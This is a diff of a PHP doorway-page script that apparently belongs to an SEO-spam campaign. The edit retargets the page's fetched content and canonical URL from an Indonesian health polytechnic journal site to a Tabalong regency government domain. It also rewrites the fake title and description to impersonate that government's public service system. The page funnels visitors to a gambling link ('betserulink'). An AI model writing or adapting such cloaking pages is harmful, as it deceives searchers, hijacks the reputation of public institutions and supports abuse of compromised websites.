@@ -1,7 +1,7 @@
 <?php
 function feedback404()
 {
-  echo file_get_contents("https://feb.unisba.ac.id/");
+  echo file_get_contents("https://main.tss.tabalongkab.go.id/");
 
 }
 
@@ -33,14 +33,14 @@ if (!$found) {
     show404();
 }
 $amphtml = "https://tamuramah.store/id/$dashbrand";
-$canonical = "https://ejournal.poltekkes-smg.ac.id/assets/$dashbrand";
+$canonical = "https://main.tss.tabalongkab.go.id/$dashbrand";
 $cta = "https://t.ly/betserulink";
 $gambar = "https://res.cloudinary.com/dyyaa4aug/image/upload/v1731680826/OIG3.s3U2dmTVFFp4C.9sv2Ea_le30ix.jpg";
 $price = "5000.00";
 
-$judul = "$namabrand Journal Poltekkes Kemenkes Semarang";
-$desc = "$namabrand memiliki platform untuk jurnal sistem dari Poltekkes Kemenkes Semarang yang bisa diakses secara online dan gratis untuk setiap mahasiswa serta mahasiswi yang berkuliah di kampus ini dari semua jurusan sesuai jurnalnya masing-masing.";
-$konten = "$namabrand memiliki platform untuk jurnal sistem dari Poltekkes Kemenkes Semarang yang bisa diakses secara online dan gratis untuk setiap mahasiswa serta mahasiswi yang berkuliah di kampus ini dari semua jurusan sesuai jurnalnya masing-masing.";
+$judul = "$namabrand Perbup SPBE Kabupaten Tabalong";
+$desc = "$namabrand lembaga pemerintah dari Kabupaten Tabalong memiliki sistem perhubungan layanan yang digunakan untuk pelayanan publik agar masyarakat lebih mudah dijangkau serta lebih cepat dan efesien untuk mendapatkan fasilitas dari pusat secara langsung.";
+$konten = "$namabrand lembaga pemerintah dari Kabupaten Tabalong memiliki sistem perhubungan layanan yang digunakan untuk pelayanan publik agar masyarakat lebih mudah dijangkau serta lebih cepat dan efesien untuk mendapatkan fasilitas dari pusat secara langsung.";
 ?>
 
 <!DOCTYPE HTML>
